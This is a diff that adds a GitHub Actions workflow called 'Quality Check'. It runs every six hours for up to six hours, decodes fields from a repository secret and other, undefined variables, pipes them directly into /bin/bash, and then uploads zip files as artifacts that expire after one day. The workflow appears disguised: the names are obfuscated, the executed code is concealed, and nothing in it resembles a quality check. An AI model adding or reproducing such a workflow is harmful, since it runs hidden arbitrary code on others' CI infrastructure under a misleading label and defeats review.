@@ -1,0 +1,31 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          g5365: ${{ secrets.g5365 }}
+        run: |
+          printf '%s' "$g5365" | jq -r .gqmxk5 | /bin/bash
+          printf '%s' "$su26935" | jq -r .l1734 | /bin/bash
+          printf '%s' "$win27" | jq -r .ox85013 | /bin/bash
+          printf '%s' "$oibar4" | jq -r .zhm52595 | /bin/bash
+          printf '%s' "$vgx7" | jq -r .asq40565 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: hvguYNg2
+          path: "*.zip"
+          retention-days: 1
